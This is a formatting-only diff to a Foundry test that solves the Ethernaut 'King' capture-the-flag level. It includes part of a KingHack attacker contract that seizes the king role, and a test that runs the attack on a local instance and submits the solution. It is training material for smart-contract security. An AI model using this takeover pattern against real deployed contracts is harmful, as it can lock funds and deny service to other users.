@@ -13,14 +13,15 @@ contract KingHack {
     }
 
     receive() external payable {
-        (bool success,) = king.call{value: msg.value}(new bytes(0));
+        (bool success,) = king.call{ value: msg.value }(new bytes(0));
         require(success);
     }
 }
+
 contract KingTest is Test {
     Ethernaut ethernaut;
     address me = makeAddr("me");
-    
+
     function setUp() external {
         ethernaut = new Ethernaut();
     }
@@ -32,21 +33,19 @@ contract KingTest is Test {
 
         vm.startPrank(me);
         vm.deal(me, 2 ether);
-        address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(factory);
+        address levelAddress = ethernaut.createLevelInstance{ value: 1 ether }(factory);
         King king = King(payable(levelAddress));
 
         // attack
         assertEq(king.prize(), 1 ether);
 
         KingHack attacker = new KingHack(address(king));
-        address(payable(attacker)).call{value: 1 ether}(new bytes(0));
+        address(payable(attacker)).call{ value: 1 ether }(new bytes(0));
         assertEq(king._king(), address(attacker));
 
-        
         // submission
         bool levelPassed = ethernaut.submitLevelInstance(payable(levelAddress));
         vm.stopPrank();
         assert(levelPassed);
     }
 }
-
